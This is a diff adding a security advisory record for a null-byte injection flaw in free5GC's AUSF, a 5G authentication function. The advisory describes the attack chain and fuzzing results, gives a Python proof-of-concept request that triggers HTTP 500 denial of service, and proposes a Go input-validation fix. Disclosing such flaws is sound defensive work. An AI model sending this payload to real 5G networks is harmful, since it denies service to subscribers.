@@ -1,0 +1,88 @@
+{
+  "id": "GHSA-qj55-47fp-p62j",
+  "modified": "2026-07-31T20:30:21.902447971Z",
+  "published": "2026-07-31T20:13:11Z",
+  "aliases": [
+    "CVE-2026-53551"
+  ],
+  "summary": "free5GC AUSF: null byte injection in supiOrSuci causes HTTP 500 internal service failure",
+  "details": "### Summary\n\nThe free5GC AUSF (Authentication Server Function) does not validate the `supiOrSuci` field in UE authentication requests. Null bytes (`\\x00`) and other control characters pass through JSON parsing unchanged and are forwarded to the UDM in an unescaped URL path. This causes Go's `net/url.Parse()` to fail, returning HTTP 500 \"System failure\" and leaking internal stack traces. An unauthenticated attacker can trigger this at scale—4.1% of `special_chars` mutations produce HTTP 500—causing denial of service for all subscribers attempting authentication through the affected AUSF. CWE-20 (Improper Input Validation).\n\n---\n\n### Details\n\nThe vulnerability lies in the AUSF's `POST /nausf-auth/v1/ue-authentications` handler. The JSON body includes a `supiOrSuci` field:\n\n```json\n{\"supiOrSuci\": \"imsi-208930000000031\", \"servingNetworkName\": \"...\", \"authType\": \"5G_AKA\"}\n```\n\nThe AUSF parses this JSON (Go's `encoding/json` accepts null bytes in strings per RFC 8259), then constructs a UDM URL by directly embedding the raw `supiOrSuci` value:\n\n```\nGET /nudm-ueau/v1/{supiOrSuci}/security-information/...\n```\n\nWhen `supiOrSuci` contains null bytes (`\\x00`), the resulting URL is illegal under RFC 3986. Go's `net/url.Parse()` fails, and the error propagates as an unhandled internal error, returning HTTP 500 with a stack trace in the response body:\n\n```\n{\"error\":{\"status\":\"INTERNAL_SERVER_ERROR\",\"message\":\"System failure\"}}\n```\n\nThe AUSF container log shows: `net/url: invalid control character in URL`.\n\n**Attack chain:**\n```\n1. Attacker → AUSF: POST {\"supiOrSuci\": \"imsi-\\x00...\", ...}\n2. AUSF: JSON parsed OK (null bytes valid in JSON strings)\n3. AUSF → UDM: GET /nudm-ueau/v1/imsi-\\x00.../security-information/...\n4. UDM: net/url.Parse() fails (\\x00 illegal per RFC 3986)\n5. AUSF ← UDM: error\n6. Attacker ← AUSF: HTTP 500 {\"message\": \"System failure\"}\n```\n\n**Contrast with C/C++ 5GCs:** The same null-byte injection in string fields causes SIGSEGV/SIGABRT in OAI (C++) and Open5GS (C), but \"only\" HTTP 500 in free5GC (Go). Go's memory safety converts the crash into a recoverable error—the service survives, but the denial is equally effective.\n\n**Discovery context:** Found via automated 5G SBI fuzzing. The `special_chars` mutation strategy injected 10 consecutive null bytes into string-valued JSON fields. Across 24h of fuzzing:\n\n| Strategy | Requests | HTTP 500s | Trigger Rate |\n|----------|----------|-----------|-------------|\n| `special_chars` | 98,304 | 4,021 | 4.1% |\n| `seed_replay` | 132,428 | 7,947 | 6.0% |\n| `grammar_aware` | 30,944 | 683 | 2.2% |\n\n100% of HTTP 500s originated from the `POST /nausf-auth/v1/ue-authentications` endpoint.\n\n### PoC\n\n**No configuration changes needed.** Default free5GC deployment is vulnerable.\n\n```python\n#!/usr/bin/env python3\nimport http.client, json\n\nAUSF_HOST = \"127.0.0.1\"   # Replace with AUSF IP (e.g. 172.24.0.50)\nAUSF_PORT = 8000\n\n# Bug: null bytes in supiOrSuci → HTTP 500\nbody_bug = json.dumps({\n    \"supiOrSuci\": \"imsi-\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",\n    \"servingNetworkName\": \"5G:mnc093.mcc208.3gppnetwork.org\",\n    \"authType\": \"5G_AKA\"\n})\n\nconn = http.client.HTTPConnection(AUSF_HOST, AUSF_PORT, timeout=5)\nconn.request(\"POST\", \"/nausf-auth/v1/ue-authentications\",\n             body=body_bug, headers={\"Content-Type\": \"application/json\"})\nresp = conn.getresponse()\nprint(f\"Bug:    Status {resp.status}\")   # Returns 500\n\n# Contrast: normal SUCI → 404 (expected, UE not found)\nbody_normal = json.dumps({\n    \"supiOrSuci\": \"imsi-208930000000031\",\n    \"servingNetworkName\": \"5G:mnc093.mcc208.3gppnetwork.org\",\n    \"authType\": \"5G_AKA\"\n})\n\nconn2 = http.client.HTTPConnection(AUSF_HOST, AUSF_PORT, timeout=5)\nconn2.request(\"POST\", \"/nausf-auth/v1/ue-authentications\",\n              body=body_normal, headers={\"Content-Type\": \"application/json\"})\nresp2 = conn2.getresponse()\nprint(f\"Normal: Status {resp2.status}\")  # Returns 404\n```\n\n**Run:** `python3 reproduce.py`\n\n**Expected fix (input validation + URL escaping):**\n```go\nimport \"regexp\"\nimport \"net/url\"\n\nvar suciRegex = regexp.MustCompile(`^[a-zA-Z0-9\\-]+$`)\n\nfunc validateSUCI(supiOrSuci string) error {\n    if strings.ContainsFunc(supiOrSuci, func(r rune) bool {\n        return r \u003c 0x20 || r \u003e 0x7e\n    }) {\n        return fmt.Errorf(\"SUCI contains illegal characters\")\n    }\n    return nil\n}\n\n// URL-escape before constructing UDM request\nudmURL := fmt.Sprintf(\"http://%s/nudm-ueau/v1/%s/security-information/...\",\n    udmAddr, url.PathEscape(supiOrSuci))\n```\n\n### Impact\n\n| Property | Value |\n|----------|-------|\n| **Authentication** | None required (unauthenticated SBI endpoint) |\n| **Impact** | Denial of Service — AUSF returns HTTP 500 for all authentication requests during attack |\n| **Information Leak** | HTTP 500 response leaks internal `net/url.Parse` error, enabling backend fingerprinting |\n| **Affected version** | free5GC v4.2.2 (latest) |\n| **Fix** | Validate `supiOrSuci` before URL construction; use `url.PathEscape()` |\n\n\n**Environment:** Ubuntu 22.04, kernel 6.8.0-110, free5GC Docker containers on bridge network 172.24.0.0/16. NFs deployed: NRF, UDM, UDR, AUSF, AMF, SMF, PCF, NSSF, MongoDB.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/free5gc",
+        "purl": "pkg:golang/github.com/free5gc/free5gc"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.2.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-qj55-47fp-p62j/GHSA-qj55-47fp-p62j.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/ausf",
+        "purl": "pkg:golang/github.com/free5gc/ausf"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.4.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-qj55-47fp-p62j/GHSA-qj55-47fp-p62j.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-qj55-47fp-p62j"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/issues/1048"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/ausf/pull/61"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/ausf/commit/bfc4a10094dbacbd862baa4686829f3fcc06ce1e"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/ausf/releases/tag/v1.4.5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/releases/tag/v4.2.2"
+    }
+  ]
+}
